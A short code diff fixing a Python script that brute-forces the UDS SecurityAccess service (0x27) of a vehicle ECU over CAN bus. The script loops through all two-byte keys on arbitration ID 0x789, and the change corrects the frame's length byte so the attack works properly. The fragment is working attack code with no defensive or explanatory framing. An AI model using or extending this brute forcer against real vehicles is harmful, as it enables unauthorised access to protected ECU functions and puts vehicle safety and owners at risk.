@@ -18,7 +18,7 @@ def brute_force():
     for key1 in range(256):
         for key2 in range(256):
 
-            request = can.Message(arbitration_id=0x789, data=[0x02, 0x27, 0x02, key1, key2, 0x00, 0x00, 0x00], is_extended_id=False)
+            request = can.Message(arbitration_id=0x789, data=[0x04, 0x27, 0x02, key1, key2, 0x00, 0x00, 0x00], is_extended_id=False)
             bus.send(request)
             response = bus.recv(timeout=1)
 
